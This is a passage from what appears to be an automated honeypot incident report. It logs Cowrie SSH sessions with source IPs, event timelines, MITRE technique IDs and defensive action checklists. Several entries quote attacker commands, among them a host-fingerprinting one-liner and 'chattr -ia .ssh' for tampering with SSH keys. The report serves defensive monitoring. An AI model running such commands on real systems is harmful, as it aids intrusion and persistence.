| **Last Seen** | 2026-07-19 17:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:14:57` | `cowrie.session.connect` |
| `2026-07-19 17:14:58` | `cowrie.client.version` |
| `2026-07-19 17:14:58` | `cowrie.client.kex` |
| `2026-07-19 17:14:59` | `cowrie.login.success` |
| `2026-07-19 17:14:59` | `cowrie.direct-tcpip.request` |
| `2026-07-19 17:15:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.206.63[.]169` to AbuseIPDB if not already reported
- [ ] Block `47.206.63[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-baa384a90928

| Field | Detail |
|---|---|
| **Source IP** | `116.114.84[.]246` |
| **First Seen** | 2026-07-19 17:15 |
| **Last Seen** | 2026-07-19 17:15 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:15:11` | `cowrie.session.connect` |
| `2026-07-19 17:15:12` | `cowrie.client.version` |
| `2026-07-19 17:15:12` | `cowrie.client.kex` |
| `2026-07-19 17:15:15` | `cowrie.login.success` |
| `2026-07-19 17:15:15` | `cowrie.direct-tcpip.request` |
| `2026-07-19 17:15:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.114.84[.]246` to AbuseIPDB if not already reported
- [ ] Block `116.114.84[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8838cebf0e17

| Field | Detail |
|---|---|
| **Source IP** | `177.159.150[.]111` |
| **First Seen** | 2026-07-19 17:18 |
| **Last Seen** | 2026-07-19 17:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:18:11` | `cowrie.session.connect` |
| `2026-07-19 17:18:11` | `cowrie.client.version` |
| `2026-07-19 17:18:11` | `cowrie.client.kex` |
| `2026-07-19 17:18:14` | `cowrie.login.success` |
| `2026-07-19 17:18:14` | `cowrie.direct-tcpip.request` |
| `2026-07-19 17:18:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.159.150[.]111` to AbuseIPDB if not already reported
- [ ] Block `177.159.150[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91a1f2fb7583

| Field | Detail |
|---|---|
| **Source IP** | `60.175.91[.]53` |
| **First Seen** | 2026-07-19 17:18 |
| **Last Seen** | 2026-07-19 17:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:18:19` | `cowrie.session.connect` |
| `2026-07-19 17:18:20` | `cowrie.client.version` |
| `2026-07-19 17:18:20` | `cowrie.client.kex` |
| `2026-07-19 17:18:22` | `cowrie.login.success` |
| `2026-07-19 17:18:23` | `cowrie.direct-tcpip.request` |
| `2026-07-19 17:18:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.175.91[.]53` to AbuseIPDB if not already reported
- [ ] Block `60.175.91[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef646bf6843b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-19 17:20 |
| **Last Seen** | 2026-07-19 17:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:20:55` | `cowrie.session.connect` |
| `2026-07-19 17:20:55` | `cowrie.client.version` |
| `2026-07-19 17:20:55` | `cowrie.client.kex` |
| `2026-07-19 17:20:56` | `cowrie.login.success` |
| `2026-07-19 17:20:57` | `cowrie.session.params` |
| `2026-07-19 17:20:57` | `cowrie.command.input` |
| `2026-07-19 17:20:57` | `cowrie.command.input` |
| `2026-07-19 17:20:57` | `cowrie.command.input` |
| `2026-07-19 17:20:57` | `cowrie.command.input` |
| `2026-07-19 17:20:57` | `cowrie.command.input` |
| `2026-07-19 17:20:57` | `cowrie.command.success` |
| `2026-07-19 17:20:57` | `cowrie.command.input` |
| `2026-07-19 17:20:57` | `cowrie.command.input` |
| `2026-07-19 17:20:57` | `cowrie.command.input` |
| `2026-07-19 17:20:57` | `cowrie.command.input` |
| `2026-07-19 17:20:57` | `cowrie.log.closed` |
| `2026-07-19 17:20:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-078eaf1bdda0

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-19 17:21 |
| **Last Seen** | 2026-07-19 17:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:21:47` | `cowrie.session.connect` |
| `2026-07-19 17:21:47` | `cowrie.client.version` |
| `2026-07-19 17:21:47` | `cowrie.client.kex` |
| `2026-07-19 17:21:48` | `cowrie.login.success` |
| `2026-07-19 17:21:49` | `cowrie.session.params` |
| `2026-07-19 17:21:49` | `cowrie.command.input` |
| `2026-07-19 17:21:49` | `cowrie.log.closed` |
| `2026-07-19 17:21:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0821ab178fc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-19 17:24 |
| **Last Seen** | 2026-07-19 17:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:24:08` | `cowrie.session.connect` |
| `2026-07-19 17:24:08` | `cowrie.client.version` |
| `2026-07-19 17:24:08` | `cowrie.client.kex` |
| `2026-07-19 17:24:10` | `cowrie.login.success` |
| `2026-07-19 17:24:11` | `cowrie.session.params` |
| `2026-07-19 17:24:11` | `cowrie.command.input` |
| `2026-07-19 17:24:11` | `cowrie.command.input` |
| `2026-07-19 17:24:11` | `cowrie.command.input` |
| `2026-07-19 17:24:11` | `cowrie.command.input` |
| `2026-07-19 17:24:11` | `cowrie.command.input` |
| `2026-07-19 17:24:11` | `cowrie.command.success` |
| `2026-07-19 17:24:11` | `cowrie.command.input` |
| `2026-07-19 17:24:11` | `cowrie.command.input` |
| `2026-07-19 17:24:11` | `cowrie.command.input` |
| `2026-07-19 17:24:11` | `cowrie.command.input` |
| `2026-07-19 17:24:11` | `cowrie.log.closed` |
| `2026-07-19 17:24:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78c0eeb4d6d7

| Field | Detail |
|---|---|
| **Source IP** | `121.202.206[.]119` |
| **First Seen** | 2026-07-19 17:24 |
| **Last Seen** | 2026-07-19 17:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:24:13` | `cowrie.session.connect` |
| `2026-07-19 17:24:14` | `cowrie.client.version` |
| `2026-07-19 17:24:14` | `cowrie.client.kex` |
| `2026-07-19 17:24:16` | `cowrie.login.success` |
| `2026-07-19 17:24:17` | `cowrie.direct-tcpip.request` |
| `2026-07-19 17:24:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.202.206[.]119` to AbuseIPDB if not already reported
- [ ] Block `121.202.206[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb6bf9aeba22

| Field | Detail |
|---|---|
| **Source IP** | `65.20.133[.]56` |
| **First Seen** | 2026-07-19 17:24 |
| **Last Seen** | 2026-07-19 17:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:24:26` | `cowrie.session.connect` |
| `2026-07-19 17:24:27` | `cowrie.client.version` |
| `2026-07-19 17:24:27` | `cowrie.client.kex` |
| `2026-07-19 17:24:28` | `cowrie.login.success` |
| `2026-07-19 17:24:28` | `cowrie.direct-tcpip.request` |
| `2026-07-19 17:24:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.133[.]56` to AbuseIPDB if not already reported
- [ ] Block `65.20.133[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0298976e0a58

| Field | Detail |
|---|---|
| **Source IP** | `70.89.116[.]5` |
| **First Seen** | 2026-07-19 17:26 |
| **Last Seen** | 2026-07-19 17:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:26:18` | `cowrie.session.connect` |
| `2026-07-19 17:26:19` | `cowrie.client.version` |
| `2026-07-19 17:26:19` | `cowrie.client.kex` |
| `2026-07-19 17:26:21` | `cowrie.login.success` |
| `2026-07-19 17:26:21` | `cowrie.direct-tcpip.request` |
| `2026-07-19 17:26:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.89.116[.]5` to AbuseIPDB if not already reported
- [ ] Block `70.89.116[.]5` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88f5f046dc4e

| Field | Detail |
|---|---|
| **Source IP** | `84.5.129[.]68` |
| **First Seen** | 2026-07-19 17:26 |
| **Last Seen** | 2026-07-19 17:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:26:26` | `cowrie.session.connect` |
| `2026-07-19 17:26:26` | `cowrie.client.version` |
| `2026-07-19 17:26:27` | `cowrie.client.kex` |
| `2026-07-19 17:26:28` | `cowrie.login.success` |
| `2026-07-19 17:26:28` | `cowrie.direct-tcpip.request` |
| `2026-07-19 17:26:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.5.129[.]68` to AbuseIPDB if not already reported
- [ ] Block `84.5.129[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bb0d0e72319

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-19 17:28 |
| **Last Seen** | 2026-07-19 17:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:28:21` | `cowrie.session.connect` |
| `2026-07-19 17:28:21` | `cowrie.client.version` |
| `2026-07-19 17:28:21` | `cowrie.client.kex` |
| `2026-07-19 17:28:22` | `cowrie.login.success` |
| `2026-07-19 17:28:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6150f5df2ca7

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-19 17:28 |
| **Last Seen** | 2026-07-19 17:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:28:22` | `cowrie.session.connect` |
| `2026-07-19 17:28:22` | `cowrie.client.version` |
| `2026-07-19 17:28:22` | `cowrie.client.kex` |
| `2026-07-19 17:28:23` | `cowrie.login.success` |
| `2026-07-19 17:28:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d96a0a73a4a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-19 17:29 |
| **Last Seen** | 2026-07-19 17:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:29:20` | `cowrie.session.connect` |
| `2026-07-19 17:29:20` | `cowrie.client.version` |
| `2026-07-19 17:29:21` | `cowrie.client.kex` |
| `2026-07-19 17:29:21` | `cowrie.login.success` |
| `2026-07-19 17:29:22` | `cowrie.session.params` |
| `2026-07-19 17:29:22` | `cowrie.command.input` |
| `2026-07-19 17:29:22` | `cowrie.command.input` |
| `2026-07-19 17:29:22` | `cowrie.command.input` |
| `2026-07-19 17:29:22` | `cowrie.command.input` |
| `2026-07-19 17:29:22` | `cowrie.command.input` |
| `2026-07-19 17:29:22` | `cowrie.command.success` |
| `2026-07-19 17:29:22` | `cowrie.command.input` |
| `2026-07-19 17:29:22` | `cowrie.command.input` |
| `2026-07-19 17:29:22` | `cowrie.command.input` |
| `2026-07-19 17:29:22` | `cowrie.command.input` |
| `2026-07-19 17:29:22` | `cowrie.log.closed` |
| `2026-07-19 17:29:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25731301bba6

| Field | Detail |
|---|---|
| **Source IP** | `114.98.63[.]18` |
| **First Seen** | 2026-07-19 17:35 |
| **Last Seen** | 2026-07-19 17:36 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:35:54` | `cowrie.session.connect` |
| `2026-07-19 17:35:55` | `cowrie.client.version` |
| `2026-07-19 17:35:55` | `cowrie.client.kex` |
| `2026-07-19 17:35:57` | `cowrie.login.success` |
| `2026-07-19 17:35:58` | `cowrie.direct-tcpip.request` |
| `2026-07-19 17:36:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.98.63[.]18` to AbuseIPDB if not already reported
- [ ] Block `114.98.63[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44e82d9170a4

| Field | Detail |
|---|---|
| **Source IP** | `121.159.71[.]249` |
| **First Seen** | 2026-07-19 17:38 |
| **Last Seen** | 2026-07-19 17:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:38:25` | `cowrie.session.connect` |
| `2026-07-19 17:38:26` | `cowrie.client.version` |
| `2026-07-19 17:38:26` | `cowrie.client.kex` |
| `2026-07-19 17:38:28` | `cowrie.login.success` |
| `2026-07-19 17:38:29` | `cowrie.direct-tcpip.request` |
| `2026-07-19 17:38:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.159.71[.]249` to AbuseIPDB if not already reported
- [ ] Block `121.159.71[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-211d3945bec9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-19 17:38 |
| **Last Seen** | 2026-07-19 17:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:38:28` | `cowrie.session.connect` |
| `2026-07-19 17:38:29` | `cowrie.client.version` |
| `2026-07-19 17:38:29` | `cowrie.client.kex` |
| `2026-07-19 17:38:31` | `cowrie.login.success` |
| `2026-07-19 17:38:32` | `cowrie.session.params` |
| `2026-07-19 17:38:32` | `cowrie.command.input` |
| `2026-07-19 17:38:32` | `cowrie.command.input` |
| `2026-07-19 17:38:32` | `cowrie.command.input` |
| `2026-07-19 17:38:32` | `cowrie.command.input` |
| `2026-07-19 17:38:32` | `cowrie.command.input` |
| `2026-07-19 17:38:32` | `cowrie.command.success` |
| `2026-07-19 17:38:32` | `cowrie.command.input` |
| `2026-07-19 17:38:32` | `cowrie.command.input` |
| `2026-07-19 17:38:32` | `cowrie.command.input` |
| `2026-07-19 17:38:32` | `cowrie.command.input` |
| `2026-07-19 17:38:33` | `cowrie.log.closed` |
| `2026-07-19 17:38:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6199c6976ff

| Field | Detail |
|---|---|
| **Source IP** | `117.177.235[.]249` |
| **First Seen** | 2026-07-19 17:38 |
| **Last Seen** | 2026-07-19 17:38 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:38:34` | `cowrie.session.connect` |
| `2026-07-19 17:38:36` | `cowrie.client.version` |
| `2026-07-19 17:38:36` | `cowrie.client.kex` |
| `2026-07-19 17:38:38` | `cowrie.login.success` |
| `2026-07-19 17:38:39` | `cowrie.direct-tcpip.request` |
| `2026-07-19 17:38:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.177.235[.]249` to AbuseIPDB if not already reported
- [ ] Block `117.177.235[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a985dcadd5f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-19 17:38 |
| **Last Seen** | 2026-07-19 17:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:38:59` | `cowrie.session.connect` |
| `2026-07-19 17:38:59` | `cowrie.client.version` |
| `2026-07-19 17:38:59` | `cowrie.client.kex` |
| `2026-07-19 17:39:00` | `cowrie.login.success` |
| `2026-07-19 17:39:00` | `cowrie.direct-tcpip.request` |
| `2026-07-19 17:39:00` | `cowrie.direct-tcpip.data` |
| `2026-07-19 17:39:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cba395746a1

| Field | Detail |
|---|---|
| **Source IP** | `34.146.248[.]7` |
| **First Seen** | 2026-07-19 17:41 |
| **Last Seen** | 2026-07-19 17:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:41:41` | `cowrie.session.connect` |
| `2026-07-19 17:41:42` | `cowrie.client.version` |
| `2026-07-19 17:41:42` | `cowrie.client.kex` |
| `2026-07-19 17:41:44` | `cowrie.login.success` |
| `2026-07-19 17:41:45` | `cowrie.direct-tcpip.request` |
| `2026-07-19 17:41:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.146.248[.]7` to AbuseIPDB if not already reported
- [ ] Block `34.146.248[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6fb33cc7fe6

| Field | Detail |
|---|---|
| **Source IP** | `121.22.99[.]2` |
| **First Seen** | 2026-07-19 17:41 |
| **Last Seen** | 2026-07-19 17:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:41:50` | `cowrie.session.connect` |
| `2026-07-19 17:41:51` | `cowrie.client.version` |
| `2026-07-19 17:41:51` | `cowrie.client.kex` |
| `2026-07-19 17:41:53` | `cowrie.login.success` |
| `2026-07-19 17:41:53` | `cowrie.direct-tcpip.request` |
| `2026-07-19 17:41:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.22.99[.]2` to AbuseIPDB if not already reported
- [ ] Block `121.22.99[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dbec84babcc

| Field | Detail |
|---|---|
| **Source IP** | `180.76.137[.]24` |
| **First Seen** | 2026-07-19 17:44 |
| **Last Seen** | 2026-07-19 17:49 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:44:09` | `cowrie.session.connect` |
| `2026-07-19 17:44:09` | `cowrie.client.version` |
| `2026-07-19 17:44:10` | `cowrie.client.kex` |
